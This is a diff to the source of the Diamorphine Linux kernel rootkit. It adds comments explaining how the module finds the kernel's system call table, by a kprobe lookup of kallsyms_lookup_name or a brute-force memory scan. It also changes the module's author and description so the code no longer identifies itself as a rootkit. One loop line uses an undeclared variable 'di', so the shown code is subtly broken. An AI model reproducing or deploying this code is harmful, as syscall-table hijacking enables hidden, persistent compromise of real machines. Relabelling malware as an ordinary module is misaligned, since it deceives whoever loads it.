@@ -51,21 +51,44 @@ orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 #endif
 
+/**
+ * Function that attempts to locate the system call table in the Linux kernel.
+ */
 unsigned long *get_syscall_table_bf(void)
 {
+	// pointer to hold the address of the system call table
 	unsigned long *syscall_table;
 
+// If the kernel version is greater than 4.4, check if the KPROBE_LOOKUP macro is defined. If it is. It uses a kprobe to dynamically resolve the address of the kallsyms_lookup_name function. This function is used to look up the address of kernel symbols by name.
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
 #ifdef KPROBE_LOOKUP
+	// type definition for the kallsyms_lookup_name function
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+
+	// pointer to the kallsyms_lookup_name function
 	kallsyms_lookup_name_t kallsyms_lookup_name;
+
+	// register the kprobe to probe the kallsyms_lookup_name function
 	register_kprobe(&kp);
+
+	// assign the address of the kallsyms_lookup_name function to the pointer
 	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
+
+	// unregister the kprobe
 	unregister_kprobe(&kp);
 #endif
+	// look up the address of the sys_call_table symbol using kallsyms_lookup_name
 	syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+
+	// return the address of the system call table
 	return syscall_table;
 #else
+
+	// If the kernel version is less than 4.4, use a brute force method to locate the system call table.
+
+	// It iterates through the memory addresses starting from the address of the sys_close function up to the maximum unsigned long value. Because the sys_close function is part of the system call table, and its address is known and by starting the search from the address of sys_close, the code begins its search in a region of memory that is likely to be close to the system call table incrementing the chances of finding the table quickly. Incrementing by the size of a pointer (sizeof(void *)). Because the system call table is an array of function pointers and each entry in this table is a pointer to a system call function. By incrementing the size of a pointer the code ensures that it checks every possible address where the system call table could start, respecting the alignment of pointers in memory.
+
+	// For each address, it casts the address to an unsigned long * and checks if the entry at the index __NR_close matches the address of the sys_close function. If a match is found, it returns the address of the system call table. Because the system call table is an array where each index corresponds to a specific system call.The index __NR_close corresponds to the sys_close system call and by checking if the entry at this index matches the address of the sys_close function, the code verifies that it has found the correct system call table.
 	unsigned long int i;
 
 	for (i = (unsigned long int)sys_close; i < ULONG_MAX; di += sizeof(void *))
@@ -379,7 +402,7 @@ static inline void unprotect_memory(void)
 
 static int __init diamorphine_init(void)
 {
-	__sys_call_table = get_syscall_table_bf();
+	__sys_call_table = get_syscall_table_bf(); // get the address of the system call table
 
 	if (!__sys_call_table)
 		return -1;
@@ -427,5 +450,5 @@ module_init(diamorphine_init);
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+MODULE_AUTHOR("x");
+MODULE_DESCRIPTION("LKM");
